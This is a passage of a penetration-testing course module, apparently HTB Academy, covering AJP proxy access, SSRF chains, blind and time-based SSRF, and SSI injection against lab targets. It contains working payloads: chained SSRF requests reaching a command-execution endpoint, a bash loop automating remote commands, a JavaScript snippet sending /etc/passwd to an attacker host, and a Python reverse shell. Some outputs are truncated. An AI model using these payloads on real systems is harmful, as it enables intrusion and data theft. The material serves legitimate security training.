# Introduction to Server-Side Attacks

* * *

Server-Side attacks target the application or service provided by a server, whereas the purpose of a client-side attack is to attack the client. Understanding and identifying the differences is essential for penetration testing and bug bounty hunting.

An excellent example of these that should help clarify the differences between server-side attacks vs. client-side attacks are `Cross-Site Request Forgeries (CSRF)` and `Server-side Request Forgeries (SSRF)`. Both of these attacks involve a web server and how servers process URLs. However, CSRF and SSRF have different targets and purposes.

Roughly quoted from the Cross-Site Request Forgery section in the [Introduction to Web Applications](https://academy.hackthebox.com/course/preview/introduction-to-web-applications) module:

CSRF attacks may utilize other client side -attacks like XSS vulnerabilities to perform requests to a web application that a victim has already been authenticated to. This allows the attacker to perform actions as the authorized user, such as changing their password to something the attacker would know or performing any unwarranted action as the victim.

From the above situation, we should be able to infer that the target is the client. Server-Side attacks target the actual application, the objective being to leak sensitive data or inject unwarranted input into the application and even achieve remote code execution (RCE). The targets in this situation are the back-end services.

* * *

## Types of Server-Side Attacks

This module will cover different types of Server-Side attacks and how to exploit them. These are:

- `Abusing Intermediary Applications`: Accessing internal applications not accessible from our network by leveraging specific exposed binary protocols.
- `Server-Side Request Forgery (SSRF)`: Making the hosting application server issue requests to arbitrary external domains or internal resources in an attempt to identify sensitive data.
- `Server-Side Includes Injection (SSI)`: Injecting a payload so that ill-intended Server-Side Include directives are parsed to achieve remote code execution or leak sensitive data. This vulnerability occurs when poorly validated user input manages to become part of a response that is parsed for Server-Side Include directives.
- `Edge-Side Includes Injection (ESI)`: ESI is an XML-based markup language used to tackle performance issues by temporarily storing dynamic web content that the regular web caching protocols do not save. Edge-Side Include Injection occurs when an attacker manages to reflect ill-intended ESI tags in the HTTP Response. The root cause of this vulnerability is that HTTP surrogates cannot validate the ESI tag origin. They will gladly parse and evaluate legitimate ESI tags by the upstream server and malicious ESI tags supplied by an attacker.
- `Server-Side Template Injection (SSTI)`: Template Engines facilitate dynamic data presentation through web pages or emails. Server-Side Template Injection is essentially injecting ill-intended template directives (payload) inside a template, leveraging Template Engines that insecurely mix user input with a given template.
- `Extensible Stylesheet Language Transformations Server-Side Injection (XSLT)`: XSLT is an XML-based language usually used when transforming XML documents into HTML, another XML document, or PDF. Extensible Stylesheet Language Transformations Server-Side Injection can occur when arbitrary XSLT file upload is possible or when an application generates the XSL Transformation’s XML document dynamically using unvalidated input from the user.

## Moving On

Let's now dive into each attack in detail.


# AJP Proxy

* * *

According to Apache, [AJP](https://cwiki.apache.org/confluence/display/TOMCAT/Connectors) (or JK) is a wire protocol. It is an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat. Historically, Apache has been much faster than Tomcat at serving static content. The idea is to let Apache serve the static content when possible but proxy the request to Tomcat for Tomcat-related content.

When we come across open AJP proxy ports ( `8009 TCP`) during penetration tests, we may be able to use them to access the "hidden" Apache Tomcat Manager behind it. Although AJP-Proxy is a binary protocol, we can configure our own Nginx or Apache webserver with AJP modules to interact with it and access the underlying application. This way, we can discover administrative panels, applications, and websites that would be otherwise inaccessible.

To see how we can configure our own Nginx or Apache webserver with AJP modules to interact with an open AJP proxy and access the underlying application, jump to the next interactive section.

Note: If you want to replicate such a vulnerable environment on a local machine, you can start an Apache Tomcat Docker exposing only the AJP-Proxy as follows:

First, create a file called `tomcat-users.xml` including the below.

#### tomcat-users.xml

```shell
<tomcat-users>
  <role rolename="manager-gui"/>
  <role rolename="manager-script"/>
  <user username="tomcat" password="s3cret" roles="manager-gui,manager-script"/>
</tomcat-users>

```

After this file is created, install the docker package in your local machine and start the Apache Tomcat Server by issuing the commands below.

#### Docker Installation

```shell
sudo apt install docker.io
sudo docker run -it --rm -p 8009:8009 -v `pwd`/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml --name tomcat "tomcat:8.0"

```


# Nginx Reverse Proxy & AJP

* * *

When we come across an open AJP proxy port (8009 TCP), we can use Nginx with the `ajp_module` to access the "hidden" Tomcat Manager. This can be done by compiling the Nginx source code and adding the required module, as follows:

- Download the Nginx source code
- Download the required module
- Compile Nginx source code with the `ajp_module`.
- Create a configuration file pointing to the AJP Port

#### Download Nginx Source Code

```shell
wget https://nginx.org/download/nginx-1.21.3.tar.gz
tar -xzvf nginx-1.21.3.tar.gz

```

#### Compile Nginx source code with the ajp module

```shell
git clone https://github.com/dvershinin/nginx_ajp_module.git
cd nginx-1.21.3
sudo apt install libpcre3-dev
./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
make
sudo make install
nginx -V

nginx version: nginx/1.21.3
built by gcc 10.2.1 20210110 (Debian 10.2.1-6)
configure arguments: --add-module=../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules

```

**Note:** In the following configuration, we are using port 8009, which is Tomcat's default port for AJP, and this is how we would use it in a real environment. However, to complete the exercise at the end of this section you should specify the IP and port of the target you will spawn (they will both be visible right next to "Target:"). The port you will see is essentially mapped to port 8009 of the underlying Docker container.

Comment out the entire `server` block and append the following lines inside the `http` block in `/etc/nginx/conf/nginx.conf`.

#### Pointing to the AJP Port

```shell
upstream tomcats {
	server <TARGET_SERVER>:8009;
	keepalive 10;
	}
server {
	listen 80;
	location / {
		ajp_keep_conn on;
		ajp_pass tomcats;
	}
}

```

**Note:** If you are using Pwnbox, then port 80 will be in use already, so, in the above configuration change port 80 to 8080. Finally, in the next step, use port 8080 with cURL.

Start Nginx and check if everything is working correctly by issuing a cURL request to your local host.

```shell
sudo nginx
curl http://127.0.0.1:80

                <div id="congrats" class="curved container">
                    <h2>If you're seeing this, you've successfully installed Tomcat. Congratulations!</h2>
<SNIP>

```


# Apache Reverse Proxy & AJP

* * *

Luckily, Apache has the AJP module precompiled for us. We will need to install it, though, as it doesn't come in default installations. Configuring the AJP-Proxy in our Apache server can be done as follows:

- Install the libapache2-mod-jk package
- Enable the module
- Create the configuration file pointing to the target AJP-Proxy port

**Note:** As mentioned in the previous section, port 80 is in use in Pwnbox, and Apache also uses it as its default port. You can change Apache's default port on "/etc/apache2/ports.conf" to any other port. If you use port 8080, don't forget to stop nginx beforehand with \`sudo nginx -s stop.\` In the following configuration, we are using 8009, which is Tomcat's default port for AJP, and this is how we would use it in a real environment. However, to complete the exercise at the end of the previous section, this time using Apache, you should specify the IP and port of the target you will spawn (they will both be visible right next to "Target:"). The port you will see is essentially mapped to port 8009 of the underlying Docker container.

The required commands and configuration files are the following:

```shell
sudo apt install libapache2-mod-jk
sudo a2enmod proxy_ajp
sudo a2enmod proxy_http
export TARGET="<TARGET_IP>"
echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:8009/
ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
sudo systemctl start apache2

```

**Note:** The below cURL command is the one you would normally use, since Apache is listening on port 80 by default. Remember that you had to change port 80 to another one of your choosing. So, to complete the exercise of the previous section, next step would be to specify the port of your choosing while using cURL, "curl http://127.0.0.1:8080" for example.

#### Accessing the "hidden" Tomcat page

```shell
curl http://127.0.0.1

<SNIP>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Apache Tomcat/X.X.XX</title>
        <link href="favicon.ico" rel="icon" type="image/x-icon" />
        <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
        <link href="tomcat.css" rel="stylesheet" type="text/css" />
    </head>

    <body>
        <div id="wrapper">
            <div id="navigation" class="curved container">
                <span id="nav-home"><a href="https://tomcat.apache.org/">Home</a></span>
                <span id="nav-hosts"><a href="/docs/">Documentation</a></span>
                <span id="nav-config"><a href="/docs/config/">Configuration</a></span>
                <span id="nav-examples"><a href="/examples/">Examples</a></span>
                <span id="nav-wiki"><a href="https://wiki.apache.org/tomcat/FrontPage">Wiki</a></span>
                <span id="nav-lists"><a href="https://tomcat.apache.org/lists.html">Mailing Lists</a></span>
                <span id="nav-help"><a href="https://tomcat.apache.org/findhelp.html">Find Help</a></span>
                <br class="separator" />
            </div>
            <div id="asf-box">
                <h1>Apache Tomcat/X.X.XX</h1>
            </div>
            <div id="upper" class="curved container">
                <div id="congrats" class="curved container">
                    <h2>If you're seeing this, you've successfully installed Tomcat. Congratulations!</h2>
                </div>
<SNIP>

```

If we configure everything correctly, we will be able to access the Apache Tomcat manager using both cURL and our web browser.

# Server-Side Request Forgery (SSRF) Overview

* * *

Server-Side Request Forgery ( `SSRF`) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. To do that, we usually need to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:

- Interacting with known internal systems
- Discovering internal services via port scans
- Disclosing local/sensitive data
- Including files in the target application
- Leaking NetNTLM hashes using UNC Paths (Windows)
- Achieving remote code execution

We can usually find SSRF vulnerabilities in applications that fetch remote resources. When hunting for SSRF vulnerabilities, we should look for:

- Parts of HTTP requests, including URLs
- File imports such as HTML, PDFs, images, etc.
- Remote server connections to fetch data
- API specification imports
- Dashboards including ping and similar functionalities to check server statuses

**Note:** Always keep in mind that web application fuzzing should be part of any penetration testing or bug bounty hunting activity. That being said, fuzzing should not be limited to user input fields only. Extend fuzzing to parts of the HTTP request as well, such as the User-Agent.


# SSRF Exploitation Example

* * *

Let's first exploit an internet-facing web application (the target can be spawned at the bottom of this section) and then work to gain remote code execution on an internal host by chaining multiple SSRF vulnerabilities. The attack flow will be as follows:

| `[PENTESTER]` | `🠖` | `[EXERCISE-TARGET]--[SSRF]` | `🠖` | `[INTERNAL-WEBSERVER]--[SSRF]` | `🠖` | `[LOCALHOST WEBAPP]` | `🠖` | `[RCE]` |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

Navigate to the end of this section and click on `Click here to spawn the target system!`, then use the provided Pwnbox or a local VM with the supplied VPN key to follow along.

Basic reconnaissance against the host shows there are only three open ports.

#### Nmap - Discovering Open Ports

```shell
nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>

Nmap scan report for <TARGET IP>
Host is up (0.00047s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds

```

Let's issue a cURLrequest to the target server using the parameters `-i` to show the protocol response headers and `-s` to use the silent mode.

#### Curl - Interacting with the Target

```shell
curl -i -s http://<TARGET IP>

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python
Date: Mon, 18 Oct 2021 09:01:02 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/load?q=index.html">/load?q=index.html</a>. If not click the link.

```

We can see the request redirected to `/load?q=index.html`, meaning the `q` parameter fetches the resource `index.html`. Let us follow the redirect to see if we can gather any additional information.

```shell

curl -i -s -L http://<TARGET IP>

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 153
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

<html>
<!-- ubuntu-web.lalaguna.local & internal.app.local load resources via q parameter -->
<body>
<h1>Bad App</h1>
<a>Hello World!</a>
</body>
</html>

```

The spawned target is `ubuntu-web.lalaguna.local`, and `internal.app.local` is an application on the internal network (inaccessible from our current position).

The next step is to confirm if the `q` parameter is vulnerable to SSRF. If it is, we may be able to reach the internal.app.local web application by leveraging the SSRF vulnerability. We say "may" because a trust relationship likely exists for `ubuntu-web` to be able to reach and interact with `internal.app.local`. This type of relationship can be something as simple as a firewall rule (or even a lack of any firewall rule).

In one terminal, let's use Netcat to listen on port 8080, as follows.

#### Netcat Listener

```shell
nc -nvlp 8080

listening on [any] 8080 ...

```

Now, let us issue a request to the target web application with `http://<VPN/TUN Adapter IP>` instead of `index.html` in another terminal, as follows. `<VPN/TUN Adapter IP>` will either be the TUN adapter IP of Pwnbox or the TUN adapter IP of the local VM you may be using (after connecting with the supplied VPN key).

#### Curl - Testing for SSRF

```shell
curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 0
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 12:07:10 GMT

```

We will receive the following into our Netcat listener confirming the SSRF vulnerability via a request issued by the target server using [Python-urllib](https://docs.python.org/3.8/library/urllib.html):

#### Netcat Listener - Confirming SSRF

```shell
Connection received on <TARGET IP> 49852
GET / HTTP/1.1
Accept-Encoding: identity
Host: <VPN/TUN Adapter IP>:8080
User-Agent: Python-urllib/3.8
Connection: close

```

Reading the [Python-urllib](https://docs.python.org/3.8/library/urllib.html) documentation, we can see it supports `file`, `http` and `ftp` schemas. So, apart from issuing HTTP requests to other services on behalf of the target application, we can also read local files via the `file` schema and remote files using `ftp`.

We can test this functionality through the steps below:

1. Create a file called index.html

```html
<html>
</body>
<a>SSRF</a>
<body>
<html>

```

1. Inside the directory where index.html is located, start an HTTP server using the following command

#### Start Python HTTP Server

```shell
python3 -m http.server 9090

```

1. Inside the directory where index.html is located, start an FTP Server via the following command

#### Start FTP Server

```shell
sudo pip3 install twisted
sudo python3 -m twisted ftp -p 21 -r .

```

1. Retrieve index.html through the target application using the `ftp` schema, as follows

#### Retrieving a remote file through the target application - FTP Schema

```shell
curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 41
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:21:09 GMT

<html>
</body>
<a>SSRF</a>
<body>
<html>

```

1. Retrieve index.html through the target application using the `http` schema, as follows

#### Retrieving a remote file through the target application - HTTP Schema

```shell
curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 41

Date: Tue, 19 Oct 2021 11:26:18 GMT

<html>
</body>
<a>SSRF</a>
<body>
<html>

```

1. Retrieve a local file using the file schema, as follows

#### Retrieving a local file through the target application - File Schema

```shell
curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd"

HTTP/1.0 200 OK

```

Bear in mind that fetching remote HTML files can lead to Reflected XSS.

Remember, we only have two open ports on the target server. However, there is a possibility of internal applications existing and listening only on localhost. We can use a tool such as ffuf to enumerate these web applications by performing the following steps:

1. Generate a wordlist containing all possible ports.

#### Generate a Wordlist

```shell
for port in {1..65535};do echo $port >> ports.txt;done

```

1. Issue a cURL request to a random port to get the response size of a request for a non-existent service.

#### Curl - Interacting with the Target

```shell
curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 30
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:36:25 GMT

[Errno 111] Connection refused

```

1. Use ffuf with the wordlist and discard the responses which have the size we previously identified.

#### Port Fuzzing

```shell
ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30

        /'___\  /'___\           /'___\

We have received a valid response for port `5000`. Let us check it as follows.

#### cURL - Interacting with the Target

<html><body><h1>Hey!</h1><a>Some internal app!</a></body></html>

```

Up to this point, we have learned how to reach internal applications and use different schemas to load local files through SSRF. Armed with this knowledge, let us try attacking the `internal.app.local` web application, again through SSRF. Our ultimate goal is to achieve remote code execution on an internal host.

First, we issue a simple cURL request to the internal application we discovered previously. Remember the information we uncovered that both applications load resources in the same way (via the `q` parameter).

#### cURL - Interacting with the Target

```shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 83
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 13:51:15 GMT

<html>
<body>
<h1>Internal Web Application</h1>
<a>Hello World!</a>
</body>
</html>

```

Now, let us discover any web applications listening in localhost. Let us try to issue a request to a random port to identify how responses from closed ports look.

#### cURL - Interacting with the Target

```shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 97
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:52:32 GMT

<html><body><h1>Resource: http127.0.0.1:1</h1><a>unknown url type: http127.0.0.1</a></body></html>

```

We have received an `unknown url type` error message. It seems the web application is removing `://` from our request. Let's try to overcome this situation by modifying the URL.

#### cURL - Interacting with the Target

```shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 99
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:55:10 GMT

<html><body><h1>Resource: http://127.0.0.1:1</h1><a>[Errno 111] Connection refused</a></body></html>

```

In this case, the web application returns some HTML rendered content containing the resource we are trying to fetch. This response will affect our internal service discovery if we use the size of the response as a filter as it will change depending on the port. Fortunately for us, ffuf supports regular expressions for filtering. We can use this ffuf feature to use the error number for filtering responses, as follows.

#### Port Fuzzing

```shell
ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'

```

We have found another application listening on port 5000. In this case, the application responds with a list of files.

#### cURL - Interacting with the Target

```shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"

 </a></body></html>

```

Let us make a quick recap of what we have achieved:

- Issue requests on behalf of ubuntu-web to internal.app.local
- Reach a web application listening on port 5000 inside internal.app.local chaining two SSRF vulnerabilities
- Disclose a list of files via the internal application

Let us now uncover the source code of the web applications listening on `internal.app.local` to see how we can achieve remote code execution.

Let us issue a request to disclose `/proc/self/environ` file, where the current path should be present under the `PWD` environment variable.

#### cURL - Interacting with the Target

```shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 584

```

Now we know that the current path is `/app`, and we have a list of interesting files. Let's disclose the `internal_local.py` file as follows.

#### Retrieving a local file through the target application - File Schema

```shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 771
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 20:40:28 GMT

<html><body><h1>Resource: file:///app/internal_local.py</h1><a>import os
from flask import *
import urllib
import subprocess

basedir = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__)

def run_command(command):
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = p.stdout.read()
    stderr = p.stderr.read()
    result = stdout.decode() + " " + stderr.decode()
    return result

@app.route("/")
def index():
    return run_command("ls -lha")

@app.route("/runme")
def runmewithargs():
    command = request.args.get("x")
    if command == "":
        return "Use /runme?x=<CMD>"
    return run_command(command)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
</a></body></html>

```

By studying the source code above, we notice a functionality that allows us to execute commands on the remote host sending a GET request to `/runme?x=<CMD>`. Let us confirm remote code execution by sending `whoami` as a command.

#### cURL - Interacting with the Target

```shell
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"

HTTP/1.0 200 OK

<html><body><h1>Resource: http://127.0.0.1:5000/runme?x=whoami</h1><a>root
 </a></body></html>

```

We can execute commands under the superuser context on the target application. But what happens if we try to submit a command with arguments, such as the below?

```shell

curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"

HTTP/1.0 400 Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1')

        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">

    <body>
        <h1>Error response</h1>
        <p>Error code: 400</p>
        <p>Message: Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1').</p>
        <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
    </body>
</html>

```

To execute commands with arguments or special characters, we need to encode them three times as we pass them through three different web applications.

For doing so, you can use any online URL-encoding service such as [urlencoder.org](https://www.urlencoder.org/). A quick way to achieve this from the terminal also exists. This is to use `jq`, which supports encoding as follows:

#### Install JQ

```shell
sudo apt-get install jq
echo "encode me" | jq -sRr @uri
encode%20me%0A

```

We can now create a bash function to automate executing commands on the target application.

#### Automate executing commands

```shell
function rce() {
function> while true; do
function while> echo -n "# "; read cmd
function while> ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
function while> curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
function while> echo ""
function while> done
function> }

```

Now we need to call the function and execute commands via:

```shell
rce
# uname -a; hostname; whoami

<html><body><h1>Resource: http://127.0.0.1:5000/runme?x=uname%20-a%3B%20hostname%3B%20whoami
</h1><a>Linux a054d48cc0a4 5.8.0-63-generic #71-Ubuntu SMP Tue Jul 13 15:59:12 UTC 2021 x86_64 GNU/Linux
a054d48cc0a4
root
 </a></body></html>

```

# Blind SSRF

* * *

Server-Side Request Forgery vulnerabilities can be "blind." In these cases, even though the request is processed, we can't see the backend server's response. For this reason, blind SSRF vulnerabilities are more difficult to detect and exploit.

We can detect blind SSRF vulnerabilities via out-of-band techniques, making the server issue a request to an external service under our control. To detect if a backend service is processing our requests, we can either use a server with a public IP address that we own or services such as:

- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) (Part of Burp Suite professional. Not Available in the community edition)
- http://pingb.in

Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP Headers, among other locations.


# Blind SSRF Exploitation Example

* * *

Now, let us exploit a blind SSRF vulnerability in a web application that receives an HTML file and returns a PDF document. This web application is the target we can spawn on the exercise at the end of this section.

Navigate to the end of this section and click on `Click here to spawn the target system!`, then use the provided Pwnbox or a local VM with the supplied VPN key to browse the target application and follow along. The application is listening on port 8080.

![image](https://academy.hackthebox.com/storage/modules/145/img/blind1_.png)

If we upload various HTML files and inspect the responses, we will notice that the application returns the same response regardless of the structure and content of the submitted files. In addition, we cannot observe any response related to the processing of the submitted HTML file on the front end. Should we conclude that the application is not vulnerable to SSRF? Of course not! We should be thorough during penetration tests and look for the blind counterparts of different vulnerability classes.

![image](https://academy.hackthebox.com/storage/modules/145/img/response_blind1_.png)

Let us create an HTML file containing a link to a service under our control to test if the application is vulnerable to a blind SSRF vulnerability. This service can be a web server hosted in a machine we own, Burp Collaborator, a Pingb.in URL etc. Please note that the protocols we can use when utilizing out-of-band techniques include HTTP, DNS, FTP, etc.

```html
<!DOCTYPE html>
<html>
<body>
	<a>Hello World!</a>
	<img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
</body>
</html>

```

For the sake of simplicity, the service we will use to test for a blind SSRF vulnerability will be a simple Netcat listener running in Pwnbox or a local VM and listening on port 9090. If you are using a local VM, remember to use the supplied VPN key. So, on the above HTML file, `SERVICE IP` should be the `VPN/TUN IP` of Pwnbox or your local VM, and `PORT` should be `9090`.

#### Netcat Listener

```shell
sudo nc -nlvp 9090

Listening on 0.0.0.0 9090

```

![image](https://academy.hackthebox.com/storage/modules/145/img/http_server__.png)

After submitting the file, we will receive a message from the web application in the browser and a request to our server revealing the application used to convert the HTML document to PDF.

![image](https://academy.hackthebox.com/storage/modules/145/img/http_payload_.png)

![image](https://academy.hackthebox.com/storage/modules/145/img/blind2__.png)

By inspecting the request, we notice `wkhtmltopdf` in the User-Agent. If we browse [wkhtmltopdf's downloads webpage](https://wkhtmltopdf.org/downloads.html), the below statement catches our attention:

`Do not use wkhtmltopdf with any untrusted HTML – be sure to sanitize any user-supplied HTML/JS; otherwise, it can lead to the complete takeover of the server it is running on! Please read the project status for the gory details.`

Great, we can execute JavaScript in wkhtmltopdf! Let us leverage this functionality to read a local file by creating the following HTML document.

```html
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true);
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>

```

In this case, we are using two [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) objects, one for reading the local file and another one to send it to our server. Also, we are using the `btoa` function to send the data encoded in Base64.

![image](https://academy.hackthebox.com/storage/modules/145/img/http_payload_2.png)

Let us start an HTTP Server, submit the new HTML file, wait for the response, and decode its contents once the HTML file is processed, as follows.

#### Netcat Listener

```shell
sudo nc -nlvp 9090

Listening on 0.0.0.0 9090

```

In the previous section, we exploited an internal application through SSRF and executed remote commands on the target server. The same internal application ( `internal.app.local`) exists in the current scenario. Let us compromise the underlying server, but this time by creating an HTML document with a valid payload for exploiting the local application listening on internal.app.local.

We will use the following reverse shell payload (it is pretty easy to identify that Python is installed once you achieve remote code execution).

#### Bash Reverse Shell

```bash
export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

```

Remember, we need to URL encode our payload. In this case, we need to encode it twice. The end result will be similar to the below.

#### URL Encoded Payload

```html
export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527

```

Now, let us create an HTML file that performs a GET request to internal.app.local, reaches the local application vulnerable to remote code execution via SSRF, and executes our reverse shell.

#### HTML Payload

```html
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>

    </body>

```

Once we start a Netcat listener on our machine and submit the HTML file above, we receive a reverse shell coming from `internal.app.local`.

```shell
nc -nvlp 9090

listening on [any] 9090 ...
Connection received on 10.129.201.238 33100

# whoami

whoami
root

```


# Time-Based SSRF

* * *

We can also determine the existence of an SSRF vulnerability by observing time differences in responses. This method is also helpful for discovering internal services.

Let us submit the following document to the PDF application of the previous section and observe the response time.

```html
<html>
    <body>
        <b>Time-Based Blind SSRF</b>
        <img src="http://blah.nonexistent.com">
    </body>
</html>

```

![image](https://academy.hackthebox.com/storage/modules/145/img/blind_time.png)

We can see the service took 10 seconds to respond to the request. If we submit a valid URL inside the HTML document, it will take less time to respond. Remember that `internal.app.local` was a valid internal application (that we could access through SSRF in the previous section).

![image](https://academy.hackthebox.com/storage/modules/145/img/blind_time2.png)

In some situations, the application may fail immediately instead of taking more time to respond. For this reason, we need to observe the time differences between requests carefully.


# Server-Side Includes Overview

* * *

Server-side includes ( `SSI`) is a technology used by web applications to create dynamic content on HTML pages before loading or during the rendering process by evaluating SSI directives. Some SSI directives are:

```html
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->

```

The use of SSI on a web application can be identified by checking for extensions such as .shtml, .shtm, or .stm. That said, non-default server configurations exist that could allow other extensions (such as .html) to process SSI directives.

We need to submit payloads to the target application, such as the ones mentioned above, through input fields to test for SSI injection. The web server will parse and execute the directives before rendering the page if a vulnerability is present, but be aware that those vulnerabilities can exist in blind format too. Successful SSI injection can lead to extracting sensitive information from local files or even executing commands on the target web server.


# SSI Injection Exploitation Example

* * *

Let us practice SSI Injection against an internet-facing web application (the target can be spawned at the end of this section). Navigate to the end of this section and click on `Click here to spawn the target system`, then use the provided Pwnbox or a local VM to follow along. By browsing to the spawned target, we come across the below.

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI_1.png)

